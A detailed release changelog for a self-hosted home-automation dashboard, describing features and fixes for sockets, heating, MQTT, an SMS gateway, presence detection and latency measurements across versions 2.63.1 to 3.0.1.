3.0.1 — the message card said nobody had a number when somebody did: under
Presence a person's number is called `number`, while `phone` there means what
their phone last said about being home, and the card was reading the wrong
one. The same slip hid the *text Falco* target. Both read the right field now.

And the chips are gone in favour of one box that takes both: start typing a
name and the people who have a number are offered with it, press Ctrl+Space
to see them all, or type a number straight in and it stands as it is. Several
are separated by commas, and a name is looked up when the message goes out —
so changing somebody's number changes it everywhere at once.

3.0.0 — a message says which way it travels. Three switches on its card —
**ntfy**, **Telegram**, **SMS** — each on by default, because switching one
off should be a deliberate act. Turn SMS on and a panel appears underneath:
**anybody with a number** in one switch, the people who have one as chips to
tick, and a box for numbers that belong to nobody. Nothing is typed twice —
the people are ticked, the free numbers are typed, and the two are kept
apart.

The automatic text gained the same choice as targets, so a rule or a button
can take one road without a written message at all: 🔔 *notify me — ntfy
only*, *— Telegram only*, *— text only*, and 🔔 *text Falco* for each person
with a number. They sit under Notifications in every target list, sorted and
grouped like the rest.

2.99.6 — the red numbers under *Where the time goes* were mostly our own
doing. Requests to one box are spaced a second apart on purpose, because a
Shelly answers 429 when it is hurried — and a box with four sockets was
asked four separate times, so the fourth socket waited three seconds and
reported that wait as its own. One `Shelly.GetStatus` carries every socket
on the box, so a box is now asked once a round and its sockets read their
part of that answer: **four requests become one**, and the whole-box section
that the slow poll wanted anyway comes with it, so that request is saved
too. The figure's explanation now says plainly that a second or two there is
the pacing rather than the box, and that a press does not wait in that queue.

2.99.5 — seventeenth latency pass, on the database of the ninth of
September (1.4 million samples, 57 devices, 22 rules). One thing found: the
day's SMS count was worked out inside every status, by walking a thousand
events — a third of the build. It is counted once and kept, and a message
going out adds one: **status 5.6 ms to 3.1 ms**. A report reaches the page in
1.6 ms median and 2.4 ms at worst when the house is quiet; 2.6 ms median
under seventy-five messages a second with a page polling and searching
beside it. Every read the page can make and every hostile save the editors
could send were tried against that database: nothing failed, nothing was
wiped. And the two switches in *Who it involves* had been reshaped by the
table cell they sat in; they sit in cells of their own now and keep their
shape.

2.99.4 — *Who it involves* was broken by a name, not by a layout: two
different things were both called `sms-people` — this table and the row of
recipient chips on the SMS tab — and the chips' `display: flex`, being later
in the stylesheet, won. Yesterday's fix made it worse rather than better,
because the grid it set was overruled a hundred lines further down. The table
has a name of its own now, and a check refuses a release where two class
names disagree about how they are laid out.

2.99.3 — a gateway's model and firmware sit on a line of their own under its
row, and the hover outline was drawn around the row alone, so it cut straight
across them. The whole card lights up now, the way a rule's does, and the
line beneath has the room it needs.

2.99.2 — three things that looked wrong. The rooms list is a grid now, so the
count and the bin line up down the column however long a room's name is. The
*Who it involves* table put its heading over one grid and its people over
another, each sized to its own contents, which is why they did not line up;
the rows take part in the table's own grid now. And a row lights up under the
pointer wherever one can be edited — bindings, rules, scenes, schedules,
groups, SMS commands, people, rooms, messages, gateways, backups — with the
same outline a device card has always had.

2.99.1 — a row's own menu, and a command line that keeps up with the
dashboard.

**Right-click a row** in any editor and, above *Move to*, it now offers
**add a new one above or below** and **copy this one above or below**. The
copy keeps everything but the identity, so it saves as a new row rather than
overwriting the one it came from, and its name gets *(copy)* so two rows are
never confused. Both work in every editor that has sections.

**New commands**, in the same colours as the rest:

    zigmon --sms                     what the modem says: signal, operator, SIM, data used
    zigmon --sms inbox               read the gateway now and print what came in
    zigmon --sms outbox              what is waiting to go, and why
    zigmon --sms flush               offer the waiting ones again
    zigmon --sms send --number +420777123456 --text hello there
    zigmon --sms test --number +420777123456
    zigmon --what-if PIR-Chodba occupancy 1     which rules would fire, and why the others would not
    zigmon --diagnose Plug-WorkshopPC           why a socket is not answering, step by step
    zigmon --battery                            which cells are sinking, and how long they have
    zigmon --weather                            what it will be outside
    zigmon --switch Light-Chodba off            switch anything the dashboard can
    zigmon --switch heat:room:r092361 set:eco
    zigmon --targets                            every name --switch will take

The ones that change something take `--pin`, or use the one in the
configuration.


2.99.0 — six at once, all of them settings in Control.

**An outbox for SMS.** A message the gateway would not take is kept and
offered again on the slow beat, so an alert is not lost while the box is
away; *Messages waiting to go* shows what is queued, with *Try them now* and
a bin. It is given up on after `sms_queue_hours`, and `sms_daily_cap` puts a
ceiling on a day's messages — a runaway rule cannot spend a tariff.

**What would happen.** Pick a device, a reading and a value, and the page
says which rules would fire and, for the ones that would not, exactly what
stands in the way — the condition, the edge, the cooldown, the must-hold, the
clock window, the presence gate or the rule being switched off. Nothing is
switched.

**Start early.** With `preheat` on, a room learns from its own history how
fast it heats (the best rise in a fortnight) and begins early enough to be at
the plan's temperature when the plan gets there, rather than an hour later. A
cold night stretches the head start, `preheat_max_min` caps it, and
`preheat_default_rate` stands in until the house has taught us better.

**The weather.** One call an hour to open-meteo, which wants no account and
no key, using the latitude and longitude already set for sunrise. It becomes
a device of its own with the temperature outside, the wind and the day's high
and low — charted like anything else, quotable in a message, and used by the
head start above.

**Why is it not working?** Right-click a socket that is misbehaving and the
daemon walks the chain in the order the answer usually lies: does the box
answer on the network, does it speak Shelly RPC, does it take the password,
does the broker carry its commands, does the ACL allow them. It names the
first thing that fails.

**Batteries.** What each cell is at, how fast it is falling per week and
roughly how many days it has left, worked out from a month of its own
history rather than from the percentage alone.


2.98.0 — everything worth having from the gateway's own documentation: it
pushes an incoming message to us instead of being asked every minute, the
modem is questioned over `ubus` (signal, operator, SIM, cell, roaming,
temperature and the SIM's data for the month and the day), numbers go out in
the 00-prefixed form Teltonika asks for, a message can go to a group the
gateway knows, and *Test* reports what it found rather than only that it
answered. The reply an SMS command sends back is now written in a proper box
of its own line — the same shape, tools and preview the alert editor has,
rather than squeezed into a table column — and a sweep of every tab found
twelve buttons still without an icon and gave them one.

2.97.2 — sixteenth latency pass, and it found a bug rather than a delay:
👤 *somebody being home* worked from a button, a rule and a text message but
not from the dashboard's own target call, which answered *unknown target* —
the right-click on a person had nothing behind it. Two milliseconds now.
Everything else measured again on the production database with the SMS
gateway running: a report reaches the page in **1.6 ms median, 2.4 ms at
worst** when the house is quiet and 2.0 ms median (12.9 ms worst) under sixty
messages a second with a page polling and searching beside it; an SMS command
end to end, reply included, 2 ms; reading the gateway's inbox 1 ms; saving
the heating 3 ms; and the whole of message_facts, now eighty-five of them,
0.66 ms.

2.97.1 — a sweep for bugs rather than for looks. A phone number that was
typed but made no sense was quietly saved as nothing at all; it is refused
now, with the words back. The page's device signature reached for a
`parents` table the daemon has never sent, so a card would not repaint when
its route through the mesh changed — it uses the device's own `via`, which
was there all along. And `sms_timeout_s` was read in six places without
being a setting anywhere; it is one now, adjustable like the rest. Nothing
else turned up: no id used before it exists, none duplicated, no icon name
without an icon, no editor saving without its guard, no meta key written and
never read, and every hostile payload the new endpoints were given came back
as a refusal rather than a wipe.

2.97.0 — the version was wrong. From 2.90 onwards the number inside the
release was never changed: the line that sets it had moved, the replacement
matched nothing, and every package since carried **2.89.8** however it was
named. The work itself all shipped — the sensor groups, action groups, the
SMS gateway and everything after — but nobody could tell one release from
the next. `test/version.py` now refuses a release whose three statements of
the version disagree, and this one is the first correct number since. If a
dashboard shows 2.89.8 in its footer, it wants this package.

Since 2.89.8, in order: a third condition in a rule, away with dates, the
month's electricity in money, watchdogs for quiet devices and an unsettled
mesh, a version kept before every Save, route history, Ctrl+K, MQTT-only
switching and a debug mode, a real search over every event, sensor groups
with filters, action groups, one summary of the day, the heating's
**by hand on the head** and its opposite, an SMS gateway that sends alerts
and takes commands, people with phone numbers, presence as a target, the
gateway as a device of its own, and eighty-five facts a message may quote.


2.89.8 — a sweep for bugs rather than for looks, on the production data.
Nothing broken was found: every endpoint the page calls is relayed and
answers, no element id is missing or repeated, every icon name resolves,
every advertised target validates and has a label, no rule, binding, scene,
schedule or room points at something that no longer exists, and bad input
(a nonsense operator, a scene running itself, a target that is gone, the
wrong PIN, a percent sign in the search) is refused with a sentence rather
than a stack trace. One piece of dead weight went: the shared-broker-password
endpoint, unused since each box got its own account in 2.87.0.

2.89.7 — the schedule's clock takes the room it needs (it grows with the
column rather than sitting at a fixed narrow width, and the sunrise offset
only appears when sunrise or sunset is chosen), the when-box says in a
tooltip what it accepts, and hovering a socket's On/Off button on the Smart
Plugs list shows what that socket is drawing.

2.89.6 — seven bits of text showed their escape codes rather than their
characters (the search dialog's hint, the away-dates tooltip, the note above
the kept versions and a few dashes and ellipses): an escape means nothing in
markup, only in a script. All seven are real characters now, and a walk over
every tab confirms nothing else is showing one.

2.89.5 — kept versions can be forgotten: a bin on each row, and *Throw them
all away* under the list. Neither touches the settings in force.

2.89.4 — a scene's action list was the short one: sockets, Zigbee switches
and heating only. It now offers everything a button does — all plugs at
once, sequences, notifications and messages, and switching a rule, schedule
or binding section on and off — everything bar running another scene.

2.89.3 — the schedule's clock is wide enough to read (118 px, and the row
gives that column the space), and the popup that says what something is
doing now follows the **Do** column as well as the target column, in
bindings, rules, scenes, sequences and schedules. Where the target is not a
device it says so in words instead: a scene lists what it switches, a room
gives its temperature and what it is holding, and a rule, a schedule or a
section of bindings says whether it is on.

2.89.2 — *What is in them* under Rooms shows each device's whole name on its
own line above its room picker, in even tiles, so a long name is neither cut
short nor squeezing anything; the energy-summary rooms are the same folds
the editors use, one per line, with the sockets inside laid out in a steady
grid rather than chips that reflow as they open; and a message starts eight
lines tall and can be dragged taller.

2.89.1 — the hover popup that says what a device last reported now follows
the target pickers too, in rules, bindings, schedules and scenes: hovering
over what a row switches shows what that thing is doing. Right-click gained
two more homes — a socket's line (its history, a rule from it, its own web
page, its name or address to copy) and a room's heating card (comfort, eco,
off, back to the plan, and the history of its thermometer).

2.89.0 — the target lists are grouped (Sockets and lights, Zigbee switches,
Heating, Scenes, Sequences, Notifications, Automation on and off) instead of
one hundred-line list, and they gained the automation itself: a rule, a
schedule or a section of bindings can be switched on, off or toggled by a
button, a rule, a scene or a schedule. A right-click on a device card offers
its history, all its values, its name or address to copy, and a new rule
from it. The message box starts six lines tall, the per-device notification
choices and the energy-summary buttons fold like the sockets do (the latter
grouped by room), a long device name no longer squeezes its room picker,
the schedule's time box fits *sunset+30*, and a scene's Run and Remove stay
clear of its actions.

2.88.5 — thirteenth pass, under a storm this time: forty-seven Zigbee
reports a second for fifteen seconds, with a dashboard polling beside it.
A report still reaches the page in **1.1 ms median, 1.4 ms at the 95th, 16
ms at worst**; the status endpoint slows from 5 ms to 13 ms while that is
going on and settles again afterwards, which is the right way round —
what a person waits for stays fast, the poll gives way. The message path
itself costs 0.09 ms end to end (one row written, one wake-up), and the
write queue never grew. One editor on the Control tab had escaped the
per-section rendering added in 2.88.4 and was still built whichever section
was open; it is gated now, so every section builds only its own.

2.88.4 — twelfth latency pass, and the first one where the browser was the
slow part rather than the daemon. Opening Control built every editor in
every section, visible or not: twenty rules, two dozen sockets, the scenes,
the settings, all of it. Only the section on screen is built now, and the
others are marked as owing a repaint and get one the moment they are shown —
Control opens in about a fifth of what it took. Two lists that every editor
row rebuilt from scratch (the sorted devices and every target in the house)
are worked out once per pass, and the option markup for a list is kept
against the list itself. On the daemon side nothing was found to be slow:
status 4.9 ms on the production database, the new watchdogs, snapshots,
money and event search all under a third of a millisecond, saves 2–4 ms,
wake-ups 1.3 ms median and 2.1 ms worst — 1.4 ms median with a busy
dashboard searching events beside it.

2.88.3 — a pass over the interface itself, tab by tab: ten buttons that had
a label and no icon now carry one (Put back, Add section, + step, Fold every
socket, Fold every group, Make a new token and the rest), nine that had
neither tooltip nor hint now say what they do, three classes used in the
page had no style rule, and two notices pointed at config.json for something
that has been in Settings for a while. Nothing behavioural: every button
was already gated correctly, no id was missing or duplicated, and no call
the page makes goes unrelayed.

2.88.2 — the search box on Events searches **every event ever recorded**,
not the five hundred on the page: the daemon does it in SQL, case does not
matter, several words all have to appear in any order, and it combines with
the kind and level pickers. The count says what it found against the whole
table — *852 of 8 981 recorded* — and new events keep the filter as they
arrive. Searching ten thousand events takes 7–40 ms.

2.88.1 — **MQTT only** in the settings stops the HTTP fallback for boxes set
up for MQTT (off by default, so nothing changes until it is asked for), every
switch now says which road it took in the event and the log, and **Debug**
writes every command and every MQTT message to the log and, if wanted, to
Events.

2.88.0 — eight things at once, all measured on the production database: a
third condition in a rule; away with dates; the month's electricity in
money on the Overview; a watchdog for devices that go quiet and for a mesh
that keeps losing them; a version kept before every Save, with *Put back*;
which router each device reaches the mesh through, over time; and Ctrl+K to
find anything. Everything they need is in Control → System.

2.87.1 — eleventh latency pass. A command over MQTT no longer waits for the
box to answer before returning: a click reaches the wire in 1.9 ms and the
API call is back in 3 ms, where waiting for the echo had put a second and a
half in between; the answer is still checked in the background and HTTP
still takes over when it never comes. Everything else measured again on the
production database — a report reaches the page in 1.6 ms median, 2.8 ms
worst, under four reports a second with rules, heating and polls live.

2.87.0 — the broker user and password on a box's MQTT strip are that box's
own, kept with it and never shared: *(kept)* now means this box has one,
the bin clears this box's, and the values in config.json are only the
fallback for a box without any.

2.86.6 — forgetting the kept broker password works: the web relay had no
entry for the call, so it came back as *unknown endpoint*. The guard that
checks every call the page makes against the relay's list now covers the
ones fetched as well as the ones posted.

2.86.5 — the kept broker password says where it is kept (config.json or this
dashboard) in the field's tooltip, and one kept here can be forgotten with
the bin beside it; the field also tells a browser's password manager to
leave it alone, which is what filled it in unasked.

2.86.4 — the broker password typed into a box's MQTT strip is kept, so the
field reads **(kept)** afterwards and the next box needs only the button;
before, *(kept)* appeared only if `plug_mqtt_password` had been put in
config.json by hand.

2.86.3 — when the ACL file cannot be read (mosquitto keeps it at 0600), the
check and the card say so as a note and print the one command that grants
the read; the installer now asks for it while it is setting the broker
account up.

2.86.2 — *Test MQTT* now says which of the three links failed: it listens to
the command topic while it asks, so a message the broker dropped is told
apart from a box that stayed quiet, and the ACL line that explains it is
named.

2.86.1 — the broker password on the MQTT strip reads **(kept)** when one is
already stored, the same as every other password field on the page.

2.86.0 — the broker's ACL is checked against what is actually set up:
Control → System → *What the broker must allow* ticks each topic in use
against `/etc/mosquitto/acl` and prints the missing lines as a block to
paste; `zigmon --check` does the same on the command line.

2.85.1 — the client id really is the box's name now: it is read from the box
itself (`Shelly.GetDeviceInfo`) when the page sends none, and since a Shelly
quietly keeps its old client id while MQTT is enabled, the value is read
back and — if it did not stick — written with MQTT off and switched on
again. The reply says so when a box refuses it anyway.

2.85.0 — a command over MQTT is only done when the box answers. A publish
the broker's ACL forbids is dropped silently and used to look like success;
now the answer on `zigmon/rpc` is waited for, HTTP takes over when it does
not come, and the log says which of the three things to check. **Test MQTT**
on the strip does the same on demand and names what is wrong.

2.84.4 — *Set the box up* also writes the box's **client id** as its name
(*Plug-TST* rather than *shellyplugsg3-…*), so the broker's log and its
connected-clients list read; and a box has one MQTT prefix, edited in the
MQTT strip — the channel row shows it read-only, since the two were the
same field shown twice.

2.84.3 — the MQTT switch on a box was not part of what Save devices sent,
so it was lost on save; it is kept now, with the prefix, and comes back
switched on after a reload.

2.84.2 — one broker account for every box: `plug_mqtt_user` /
`plug_mqtt_password` (*plug*) and `plug_mqtt_root` (*shellies*) in
config.json; the MQTT strip is pre-filled with them and suggests
`shellies/<name>` as the prefix, and *Set the box up* uses the shared
password when the field is blank. The README carries the ACL block that
covers every box at once.

2.84.1 — *Set the box up* works: it uses the box password the daemon already
holds rather than asking the page for it, and offers the box's own
connection types — TLS without validation (pre-filled when the broker is
TLS), TLS with the box's CA, or plain — with the port following the choice.

2.84.0 — commands over MQTT: an MQTT switch and broker fields on every box
under Plugs and sensors, a *Set the box up* that writes the broker into the
box itself, commands as RPC over the broker with HTTP as the fallback, and
two more actions for a box in every Do list — reboot, reset its counters.

2.83.2 — the Smart Plugs card is a list, not a scroll: one line per socket
with its name, state, current draw and small On / Pulse buttons, sorted like
everywhere else, and a fold under each (closed by default) for the box's
details and its counter resets. *Open every socket* / *Fold every socket*
at the top; what you open stays open for the session.

2.83.1 — a scene's Run and Remove are two small icon buttons on one line,
and each action's remove is a single icon at the end of its own line, so a
scene with many actions no longer carries a tall column of buttons.

2.83.0 — sections everywhere they belong, including Messages under Alerts &
energy; a ➕ on each section header adds a new row into that section; a
*Move to* menu on every row (click the handle, or right-click) moves it
between sections without dragging; and a section left empty survives a
save and a reload.

2.82.3 — sections, second round, tested on the production data: dragging a
row into another section without changing its place in the order was not
counted as a change and was thrown away on the next repaint; a managed
device's section was not sent with Save nor read back; the rename button
had no icon; the count sat against the name. All four fixed; a section now
reads *Plugs · 1 item*, and a device dragged into it is still there after
Save and a reload.

2.82.2 — the sections' stylesheet had not made it into the page, so a
section changed state on a click but never actually folded; it folds now.

2.82.1 — naming a section, renaming one, and adding a Wi-Fi device by name
ask in the dashboard's own dialog, not the browser's grey box; Enter
confirms, Escape cancels, and a blank or duplicate name is told so in
place. No browser prompt is left anywhere in the page.

2.82.0 — named sections in the Control editors: bindings, rules, scenes,
sequences, schedules, presence triggers and managed devices can be folded
under names of your own, rows drag between sections, sections drag above
each other, everything starts folded, and it all saves with the editor.

2.81.1 — measured on a production database (a million samples over eight
days, 50 devices, 23 sockets, 21 rules): the daemon builds status in 4 ms,
a chart in 4 ms, the whole Overview's charts in 40 ms, and wakes a page in
under 2 ms under a report a quarter-second - none of that is where a lag
lives. Two things in the data were. Two dozen boxes each pushing new
watts every few seconds woke every open page for each of them, so a page
was pulling a quarter-megabyte of status several times a second and
repainting each time; a number changing now wakes the pages at most twice a
second, together, while a relay, a button or a rule still wakes them at
once (2 ms, measured). And a rule saying "off" every time a sensor cleared
sent the box the same "off" every minute and logged a switch each time -
one box had five thousand of those; a rule's command that the box already
confirms is now no command at all.

2.81.0 — a lag can now be placed: Control → System → *Where the time goes*
and `zigmon --diag` show, live, the daemon's own path, the broker's round
trip, each box's answer time and the Zigbee command-to-echo time, colour
coded. Two things changed on the strength of what that showed: the
network-map scan runs every half hour instead of every five minutes (the
coordinator walks the mesh for seconds during one, and commands wait), and
a field left with the cursor in it pauses the repaint for at most fifteen
seconds instead of indefinitely.

2.80.6 — tenth latency pass, this time under load rather than idle: a scene
switching four sockets of a strip every second, a button press every
second, and four sensor reports a second, all at once. Measured with one
waiter per message so the meter itself cannot fall behind: a report reaches
the dashboard in 1.4 ms median, 2.6 ms worst, over 116 messages — the same
figures as an idle daemon. A button press becomes a switch command in
1.5 ms; a toggle is one round trip to the box (`Switch.Toggle`, no read
first) and the card shows the new state before the box confirms it. The one
change: the clock thread beats every quarter second instead of every half,
so a "must hold for N s" rule fires within 0.25 s of the stretch being long
enough; each beat costs microseconds.

2.80.5 — a scene switches the sockets of one strip in the order its actions
are written, every time, 20 ms apart, instead of in whatever order four
threads happened to run; `plug_command_gap` default is 20 ms (was 50).

2.80.4 — ninth latency pass. A button press reaches the wire as a switch
command in 1.5 ms (median of fifteen, worst 1.8 ms); the knob path is the
one deliberate exception at a quarter-second, so a burst of clicks is one
message. A two-minute soak straight at the daemon with rules, heating and
polls live: wake-ups 1.2 ms median, 2.9 ms worst, no outlier. One thing
found: a dropdown keeps the keyboard focus after a choice, and the repaint
pause introduced in 2.78.5 honoured that focus — so after picking a level on
a card the page stood still until something else was clicked. A choice now
releases the focus, and the repaint with it.

2.80.3 — the explanation under a valve card's controls is a tooltip on the
level line rather than a paragraph taking up half the card.

2.80.2 — *Off* (and an open window) now shuts a valve with the head's own
**off** mode rather than a set point of five, which a head reading the
radiator's own warmth would simply regulate against; the next preset turns
it back on.

2.80.1 — the *Right now* dropdown on a Heating card is gone: the preset
buttons on the line above are the same choice, and two copies of it could
only disagree.

2.80.0 — taking a valve over now also clears `force` (which pins the valve
open or shut regardless of the set point) and asks a TS0601 head for **auto**
rather than **heat**, since on those heads `heat` means heat without
regulating and `auto` means hold the number. A valve that is still forced
says so on its line.

2.79.6 — on a valve's own card the five levels are a dropdown rather than a
row of small buttons, which is what fits on a device card; the Heating tab
keeps them as buttons, where there is room.

2.79.5 — the heating controls carry icons like everything else (🔆 Comfort,
🌿 Eco, 🌙 Night, ⛔ Off, 📅 Plan, ⏱️ for the hold, 🌡️ Match the room), and a
button on a valve line no longer sits against the text beside it.

2.79.4 — a **Close** button beside each valve shuts the room to frost
protection; on a valve that belongs to no room it switches the head off
directly.

2.79.3 — a valve outside any room says on its card that the presets it is
showing are the head's own, and where to put it to get the room's five
instead.

2.79.2 — the Rearrange switch appears only on the tabs whose cards can be
moved, and the Heating cards can now be moved as well; their order is the
rooms' order.

2.79.1 — a valve that belongs to a room shows the room's controls on its own
card — the same slider and the same Comfort / Eco / Night / Off / Plan — in
place of the head's firmware presets, so there is one set of words for
heating everywhere.

2.79.0 — a **Rearrange** switch beside the lock decides whether cards can be
dragged. Off by default, so a slider or a dropdown on a tile can be used
without the tile moving; on, the movable cards are outlined and their
controls step aside.

2.78.5 — an open dropdown, a focused field or a held slider anywhere on the
page now pauses the card repaint until it is let go, instead of being closed
or reset by the next reading.

2.78.4 — the slider is the whole control: the − and + beside it did the
same thing in bigger steps and are gone. Holding any slider now freezes the
repaint until it is let go, so a reading arriving mid-drag no longer
rebuilds the tile under the thumb.

2.78.3 — *Match the room* works: the web relay had no entry for the
calibrate call, so the browser's request never reached the daemon and came
back as *unknown endpoint*.

2.78.2 — a remote's card leads with what was pressed or turned again (a
knob that also reports its cell voltage was showing 3000 mV instead); a
valve's card leads with what it measures, holds and how far it is open, with
its stored settings left in All values; and its target is set with the same
slider the Heating cards use.

2.78.1 — devices are categorised by what they report and carry their own
icon (valve, knob, motion, contact, thermometer); the lists group by that
and sort by name inside. A heating card shows each head's own reading,
valve position, running state, mode and battery, and can set its offset to
match the room's thermometer.

2.78.0 — a self-programmed radiator head (TuYa/Immax TS0601) is put into
manual with away mode cleared before it is driven, so its own weekly
programme stops overwriting what the room asks for; and the temperature on
a Heating card is set with a slider that speaks when it is let go.

2.77.4 — eighth latency pass, over the knob, the room holds and the
presets. Two things fixed. Every heating save — every knob click, every
preset — wiped the memory of what each valve had last been sent, so the next
round re-sent every valve in the house its current number, and sleeping
heads drained a queue of repeats; the memory is kept now and only a changed
wish goes out. And the plug poll started every box's request in the same
instant; the boxes are now asked one after another across the first half of
the round. A knob press over MQTT reaches the dashboard in 8–13 ms
including the room update; a two-minute soak straight at the daemon, with
rules, heating and plug polls live, gave wake-ups of 1.0 ms median and 6.8
ms worst, not one outlier.

2.77.3 — the room's presets are buttons on its card (Comfort, Eco, Night,
Off, Plan), and a heating level target takes **next** to cycle through them
from a single button.

2.77.2 — a room's temperature can be set by hand on its card (−, a number,
+, and for how long: until the plan's next step, or a fixed 1–24 hours);
the same length can be sent with a target as `hold_s`.

2.77.1 — the number a room is holding is labelled on its card with why
(*eco*, *comfort*, *away*), and a hand-set one is shown large in amber with
*by hand until 22:00*, so a knob's effect is seen at a glance.

2.77.0 — a room's temperature is a target: 🔥 *temperature in ⟨room⟩* takes
to / up by / down by, so a knob nudges the room and every valve in it
follows; the nudge holds until the plan's next change of level (or four
hours without a plan), the card says so, and *Back to the plan now* ends it
early.

2.76.2 — a knob on a valve feels like a dial: steps accumulate on what was
last sent, the card updates the moment the knob moves, and a burst of
clicks leaves as one message with the final number instead of a queue the
sleeping head drains one at a time.

2.76.1 — in a binding row the *set to* trio (to/up by/down by, the number,
the unit) borrows the neighbouring pulse-ms column, so the number is a
field rather than a sliver.

2.76.0 — *set to* on a number can step **up by** or **down by** an amount,
so a rotary knob drives a valve's target temperature; hovering a rule's
source, reading or threshold shows the sensor's current values with the
chosen one marked; and a valve's settables are named by what they are
(*Frost protection*, *Heating stop*) rather than a converter's generic
*State*.

2.75.2 — seventh latency pass, over the heating targets, the sequence
steps and everything else since 2.72: nothing in the daemon's hot path
changed shape. A four-minute soak (959 reports, four a second, rules and
heating live): wake-up 1.5 ms median, 2.2 ms p99, no outlier; the same
again ran without a single error. One thing tightened: the process's RSS
crept up a few MB per hour of heavy dashboard use, and tracemalloc showed
nothing held — it was glibc handing every request thread its own malloc
arena. The unit now caps arenas at two.

2.75.1 — a sequence's reset takes the same choices as a step: a scene, or
any single target with an action.

2.75.0 — a sequence step can be any single target with an action — a plug,
a light, a valve's target, a room's heating level — not only a scene. A
scene is still the way to do several things in one step.

2.74.2 — heating control per room: a switch on the room's card, and a
*heating control in ⟨room⟩* target (on / off / toggle) everywhere a target
is chosen.

2.74.1 — a room can be marked as not heated: its card folds to the title,
nothing is sent for it, and it is not offered as a heating target.

2.74.0 — heating is a target everywhere: *heating control* and *away mode*
switch on/off/toggle, a room's level is set to plan / comfort / eco /
night / off, from any binding, rule, scene, schedule or presence trigger.
And a room can be told which of its door and window sensors count as
windows.

2.73.0 — each room on the Heating tab can be told which thermometer to read,
for a room that has none of its own or has several.

2.72.0 — sixth latency pass, over everything added since the last one
(rooms, heating, the phone reports, the ntfy listener, the rule workers,
the reorderable editors, the QR encoder). Two things found. The ntfy
listener read its stream with no timeout, so a link that died quietly would
have left it waiting forever; it now reconnects after two minutes of
silence, since ntfy keeps the line alive every forty-five seconds. And every
draggable row registered its own mouse-up listener on the document each
time an editor was repainted, which grew without bound over a long session;
there is one now. Measured on the real database: status 1.9 ms, the
heating state 0.2 ms, a two-minute soak at four reports a second with
wake-ups of 1.3 ms median and 3.3 ms worst, no outlier, memory flat.

2.71.6 — on a Heating card, the *stop for an open window* switch is set off
from the plan above it by a rule and some space, and sits level with its
label instead of riding above it.

2.71.5 — every line of the energy table carries its icon: a socket or a bulb
per plug, a house for a room, the strip's own mark where the grouping is by
box, and a sigma on the total.

2.71.4 — the energy table groups by room only: the separate *Lights* section
is gone, and every group now starts folded when the page loads.

2.71.3 — the QR code on a Setup chip was being drawn behind the dialog it
belongs to (z-index 80 under a backdrop at 100), so hovering appeared to do
nothing; and a browser that refuses the clipboard call did so silently,
which made clicking look dead. The QR now sits above everything, and a copy
falls back to the old method and says so if even that fails.

2.71.2 — the *What is in them* list under Rooms is ordered like every other
device list: sockets, lights, sensors, buttons, routers, and by name inside
each.

2.71.1 — a socket marked as a light carries a bulb icon everywhere it is
listed, and the dropdowns group the lights together, by name within the
group.

2.71.0 — the editors under Control can be reordered by dragging a row by
the handle on its left: bindings, rules, scenes, rooms, sequences,
schedules, people, presence triggers, messages, devices and gateways. The
order is saved by that section's own Save button.

2.70.1 — Rooms sits under Scenes in Control → Automation.

2.70.0 — hovering a copy chip in the phone Setup dialog shows its contents
as a QR code, so a link or a token goes to the phone by pointing a camera at
the screen. The encoder is written out in the page (byte mode, level L,
versions 1-10, all eight masks scored); every code it makes was read back
with an independent decoder across 154 payloads, including Czech diacritics.

2.69.1 — picking *a light* now survives Save: the web relay copies each
device field by name onto what it forwards to the daemon, and the new one
was not on that list, so the choice was dropped on the way and came back a
socket.

2.69.0 — a plug can be marked as **a light**: identical in every other way,
but listed in a section of its own in the energy table, folded away when the
page opens.

2.68.3 — a room just added can be assigned to straight away: it used to get
its id only when saved, so until then the only choice beside every device
was a dash that did nothing. The empty choice now reads *not in a room*,
and each room says how many things are in it.

2.68.2 — Rooms moved from Control → Devices to Control → Automation, above
the bindings, since what a room is for is the automation side.

2.68.1 — the phone Setup dialog opens wide (900 px) so a link is one line
rather than four, its copy chips stand on their own, and the bold in a step’s
heading is bold rather than the letters <b>.

2.68.0 — the phone **Setup** dialog carries the step-by-step for the
handset: the Location Services setting, every screen of the iOS automation
in order, the ntfy or direct variant depending on what is configured, how
to test it, and tap-to-copy chips for the URL, topic and token.

2.67.3 — the Rooms and Heating editors behave like every other one: their
buttons carry icons, and a locked page no longer greys the controls out and
leaves them dead — you edit, and the PIN is asked for when you save.

2.67.2 — the energy table groups even before any room exists: the sockets
of one strip fold into a line of their own, with a *Fold every group*
button, and the folds are remembered across a reload.

2.67.1 — the row above the Heating rooms lines its labels and controls up
in a grid instead of leaning them against each other, and the SSH fields
read in the order they are filled in: how to get in, port, username,
password.

2.67.0 — rooms, and a Heating screen built on them: three temperatures and
a weekly plan per room, an away switch, an open window that stops the room
while it lasts, all pushed to the valves in that room and only when the
number has changed. The energy table is grouped by room and folds. A
summary of what the month cost goes out on the first, by notification.

2.66.1 — settings layout: the SSH password sits next to the username it
belongs with and the port after them, and a label too long for its column no
longer wraps and drops its own field half a row below the others.

2.66.0 — a phone can report its own arrivals and departures, from its
geofence, over mobile data, before it is on the Wi-Fi: a token per person, a
link to paste into an iOS Shortcut or Tasker, and an ntfy topic as an
alternative for anyone who would rather expose nothing. Arriving counts at
once; a reported departure is checked against the controller first.

2.65.0 — fifth latency pass, nothing found in the daemon: a two-minute soak
on the real database (4 reports/s) gave wake-ups of 1.5 ms median, 2.1 ms
p99, 2.5 ms max with no outlier at all; a full garbage collection of the
70 MB heap costs 4 ms and gen-2 collections never ran during 3,000 status
builds. The one thing tightened is the web layer: the installer (and
`--upgrade`) sets the php-fpm pool to keep 6-24 idle workers with 8 started
(the stock five made an opening page wait for forks, since every open tab
already holds one worker for its live wait) and installs php-opcache.

2.64.1 — arriving and leaving are noticed when they happen. What the access
points last reported over SSH was being folded back into every presence
round whatever its age, so a phone that had left stayed on the network - and
its owner stayed home, and "when the last person leaves" stayed unfired -
until the next point probe, up to `detail_s` (three minutes by default)
later. That snapshot now only fills in detail on clients the controller
still lists, and carries a client of its own only while it is fresh. For a
minute after anybody comes or goes the controller is also asked every five
seconds instead of every `poll_s`.

2.64.0 — thermostatic radiator valves. The keys a head reports are named
and carry their units, its card gains a target-temperature control and a
mode picker, and a new action **set to …** makes its target and its mode
usable in bindings, rules, scenes, schedules and presence triggers, with
the head's own range and list of modes offered in the editor.

2.63.2 — fixes the Wi-Fi tab, blank since 2.62.2: the *why out* line meant
for the People editor had landed in the *Other networks* renderer, where it
threw on the first row and took the client list down with it. Both draw
again; the line is where it belongs.

2.63.1 — the Wi-Fi tab never goes blank: when the controller is not
answering, the client list says so with the error and when it was last
asked; a client record that cannot be drawn gets a one-line row instead of
taking the list down; and any tab that fails to draw shows the error at
its top while the rest of the page carries on.

